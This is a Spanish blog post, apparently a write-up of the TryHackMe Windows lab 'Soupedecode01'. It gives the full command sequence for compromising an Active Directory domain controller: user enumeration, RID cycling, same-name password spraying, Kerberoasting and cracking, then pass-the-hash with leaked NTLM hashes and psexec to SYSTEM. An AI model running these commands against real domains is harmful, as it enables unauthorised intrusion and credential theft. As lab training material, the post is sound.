---
layout: post
title:  "Writeup Soupedecode01"
date:   2026-02-16
categories: [Writeup, TryHackMe]
tags: [windows, facil]
image: 
  path: /images/writeup-soupedecode01/Pasted image 20260107105602.png
---

***Dificultad: Facil***

***Sistema Operativo: Windows***

--------------------------------------------------------- 

Hola! hoy empezamos a subir writeups y a resolver maquinas tambien de *TryHackMe*, y empezamos con una maquina windows facil, que nos da los ataques comunes para los entornos de directorio activo y DC's (domain controlers)

lo primero que haremos, será crear los  directorios de trabajo:
```bash
mkdir nmap exploit content && cd nmap
```

entraremos a nuestra carpeta nmap, y haremos el primer escaneo de reconocimiento de puertos:
```bash
nmap -p- --open -Pn -n -v -T4 --source-port 53 10.80.156.35 -oN reconocimiento
```
agregamos puerto de origen 53 para que nuestras solicitudes se enmascaren como simples solicitudes DNS

y tenemos los tipicos puertos de un DC:
```python
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49676/tcp open  unknown
49718/tcp open  unknown
49777/tcp open  unknown
```

vamos ahora a lanzar los scripts basicos de reconocimiento de nmap:
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sCV -Pn -n -vv --source-port 53 10.80.156.35 -oN puertos
```

tenemos:
```python
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-29 09:25:52Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 126
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-28T08:51:35
| Not valid after:  2026-05-30T08:51:35
| MD5:   7e8c:8209:5055:97c7:9467:395d:3109:d221
| SHA-1: e21e:9674:2171:797f:70b5:ded3:e5aa:5b20:4e9a:5b25
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQWktk9tdH8I1B5GtSu623oTANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZEQzAxLlNPVVBFREVDT0RFLkxPQ0FMMB4XDTI1MTEyODA4NTEz
| NVoXDTI2MDUzMDA4NTEzNVowITEfMB0GA1UEAxMWREMwMS5TT1VQRURFQ09ERS5M
| T0NBTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALIJhVRF+7GsB5XZ
| saKXYRHXgxWiuhM7VL4frIDXxTAU9+gZaYVHe8CqQg5wOBHOAqu7FDmL9jZ7NPm5
| 2UQZf9mPUdLfUQhzVEClqJbET2ukmiqb2zZ2EUlhUm7XfqKrReHkzS20DLiSPcKF
| RqvgtYPT8aaSGfTWvaOjXsBw6MiOj4vr6L4VWq8L0L+01Dj2sFcVWRsbNf1mm8vw
| FrCr1kD/1fvQL05eJTZNwmZ9JPR0vdpJ0hcAUj5ckEAcIhnLls1ZuS8KgvpHmYqe
| A1PNmqGG/wh+8BihKclzFefk3n6Lvtj5BP3PFppdxj68M4H/YCXdqSIeHZ5bnvwV
| KyC9QCECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQCkofDA6wWLkOShx7XzKLSSa/VKGKV+RPGwqXpN
| B77k0yu/67YBpHTbb35kxrpJKL4Beu4vjYs8k719HP00RZXZWBCMHizhWKVQC7kI
| o6q7ThD4K05O59fqAY/9p+MLjHpEoVEcY0GhvyXB8rQtFr+fP85ArIdzOdrT/cNf
| OoT25spG9bL10Z0ovsPbdarQJzV7TkUj0WFKLSeKpxBZJ/hQWpcbzuUGQQxNmiBQ
| PTnIFAGw02SP0UEJRPTvQCBYgmXhBIj8wZfFqiwk1/RHZp0lmmEMJsrIpMv2lBS9
| 4e0Crbvt0lk8IqaZG6Jzt3jotZCky/KwbDup87l2sIJdwCFq
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-29T09:25:55+00:00
|_ssl-date: 2025-11-29T09:26:34+00:00; +4m44s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m44s, deviation: 0s, median: 4m43s
| smb2-time: 
|   date: 2025-11-29T09:25:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33368/tcp): CLEAN (Timeout)
|   Check 2 (port 36731/tcp): CLEAN (Timeout)
|   Check 3 (port 55327/udp): CLEAN (Timeout)
|   Check 4 (port 64833/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
tenemos un nombre de dominio: dc01.soupedecode.local

ahora, intentando con la herramienta kerbrute, enumeracion de usuarios, vemos algunos validos con el siguiente comando y la siguiente lista:
```bash
./kerbrute userenum --dc 10.82.149.46 -d soupedecode.local /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

con 2 listas diferentes, hemos encontrado los siguientes usuarios:
```python
2025/12/01 17:08:51 >  [+] VALID USERNAME:       admin@soupedecode.local
2025/12/01 17:08:51 >  [+] VALID USERNAME:       guest@soupedecode.local
2025/12/01 17:08:51 >  [+] VALID USERNAME:       administrator@soupedecode.local
2025/12/01 17:10:23 >  [+] VALID USERNAME:       charlie@soupedecode.local
```

el único usuario valido que nos ha dejado conectar a smb, ha sido guest con la contraseña en blanco, pero no podemos interactuar con nada de los recursos compartidos en la carpeta smb

nxc tiene un método para buscar cuentas a través de enumeración de RIDs o rid cycling, conectándose a IPC$ share, intentandolo con la cuenta *guest*

```bash
nxc smb 10.82.149.46 -u guest -p '' --rid
```

*nota: esto funciona solo si el servidor permite las null sessions y no tiene restringida la enumeración de cuentas o sea, el valor del registro HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RestrictAnonymous = 0*

pero el resultado es un poco desorganizado (CTF's): 
<img src="/images/writeup-soupedecode01/Pasted image 20251203152317.png" alt="image">

pero, con un par de filtros, podemos tener una lista limpia y  meterla en una lista de usuarios:
```bash
nxc smb 10.82.143.134 -u guest -p '' --rid | grep -oP '\d+:\s*\K[^ ]+' | cut -d '\' -f2 > users.txt
```

ahora, podemos intentar buscar credenciales débiles para estos usuarios:

luego de intentar varios diccionarios, intente probar el típico método de (mismo contraseña para mismo nombre de usuario) con el comando:

```bash
nxc smb 10.82.143.134 -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

tenemos como resultado:
<img src="/images/writeup-soupedecode01/Pasted image 20251214203052.png" alt="image">

con esto, puedo intentar listar y conectarme mediante smb con la herramienta smbclient:
```bash
smbclient \\\\10.82.163.204\\Users -U ybob317
```

encontramos la flag en el escritorio del usuario ybob317: 
<img src="/images/writeup-soupedecode01/Pasted image 20251214214518.png" alt="image">

ahora, teniendo credenciales de usuario validas, podemos probar el famoso ataque *kerberoasting:*

vamos a intentar usar estas credenciales para solicitar tickets TGS y luego intentar crackearlos

primero, vamos a sincronizar el reloj de nuestro equipo con el dominio:
```bash
sudo ntpdate soupedecode.local
```
<img src="/images/writeup-soupedecode01/Pasted image 20251214215308.png" alt="image">

segundo, solicitaremos los tickets al dominio con impacket:
```bash
impacket-GetUserSPNs  soupedecode.local/ybob317:ybob317 -dc-ip 10.82.163.204 -request -output hashes.txt
```
<img src="/images/writeup-soupedecode01/Pasted image 20251214215355.png" alt="image">

por ultimo, usaremos john the ripper para crackear la contraseña:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt  hashes.txt
```
<img src="/images/writeup-soupedecode01/Pasted image 20251214215425.png" alt="image">

no ha tardado mucho, lo que me hace pensar que esta contraseña pertenece al primer ticket **file_svc** , (de igual modo podemos verificar)

<img src="/images/writeup-soupedecode01/Pasted image 20251214215641.png" alt="image">

ahora, mirando los recursos a los que podemos acceder con estas nuevas credenciales, vemos que finalmente tenemos acceso a *backup*:
```bash
smbclient \\\\10.82.163.204\\backup -U file_svc
```
<img src="/images/writeup-soupedecode01/Pasted image 20251214222216.png" alt="image">

este archivo txt, tiene hashes ntlm:
<img src="/images/writeup-soupedecode01/Pasted image 20251214222307.png" alt="image">

separamos los usuarios de los hashes, y probamos con nxc:
```bash
WebServer$
DatabaseServer$
CitrixServer$
FileServer$
MailServer$
BackupServer$
ApplicationServer$
PrintServer$
ProxyServer$
MonitoringServer$
```

```hash
c47b45f5d4df5a494bd19f13e14f7902
406b424c7b483a42458bf6f545c936f7
48fc7eca9af236d7849273990f6c5117
e41da7e79a4c76dbd9cf79d1cb325559
46a4655f18def136b3bfab7b0b4e70e3
46a4655f18def136b3bfab7b0b4e70e3
8cd90ac6cba6dde9d8038b068c17e9f5
b8a38c432ac59ed00b2a373f4f050d28
4e3f0bb3e5b6e3e662611b1a87988881
48fc7eca9af236d7849273990f6c5117
```

```bash
nxc smb 10.82.146.191 -u content/users -H content/hash --continue-on-success
```
<img src="/images/writeup-soupedecode01/Pasted image 20251215164126.png" alt="image">

```python
 SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559
```

para conectarnos a la maquina podemos usar psexec de impacket:
```bash
impacket-psexec 'FileServer$'@10.82.138.108 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

<img src="/images/writeup-soupedecode01/Pasted image 20251215171451.png" alt="image">

*y somos NT authority System*
flag de root:
<img src="/images/writeup-soupedecode01/Pasted image 20251215171258.png" alt="image">


-------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">

